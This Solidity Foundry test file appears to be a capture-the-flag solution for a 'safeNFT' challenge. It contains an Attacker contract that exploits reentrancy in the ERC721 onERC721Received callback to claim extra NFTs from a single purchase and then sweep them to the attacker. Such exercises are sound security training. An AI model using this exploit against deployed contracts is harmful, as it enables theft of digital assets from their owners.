// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

import {safeNFT} from "../src/SafeNFT.sol";

contract Attacker {
    address private owner;
    safeNFT private target;

    constructor(safeNFT _target) {
        owner = msg.sender;
        target = _target;
    }

    function getNFTs() external payable {
        target.buyNFT{value: 0.01 ether}();
        target.claim();
    }

    function getTokens() external {
        uint256 balance = target.balanceOf(address(this));
        for (uint256 i = 0; i < balance; i++) {
            target.transferFrom(
                address(this),
                owner,
                target.tokenOfOwnerByIndex(address(this), 0)
            );
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        uint256 balance = target.balanceOf(address(this));
        if (balance <= 1) {
            target.claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract SafeNFTTest is Test {
    safeNFT private challenge;

    address private hacker = makeAddr("hacker");

    function setUp() external {
        challenge = new safeNFT("token", "TOK", 0.01 ether);
        deal(hacker, 0.1 ether);
    }

    function test_hack() external {
        vm.startPrank(hacker);
        Attacker attacker = new Attacker(challenge);
        attacker.getNFTs{value: 0.1 ether}();
        attacker.getTokens();
        vm.stopPrank();

        assertTrue(challenge.balanceOf(hacker) > 1);
    }
}
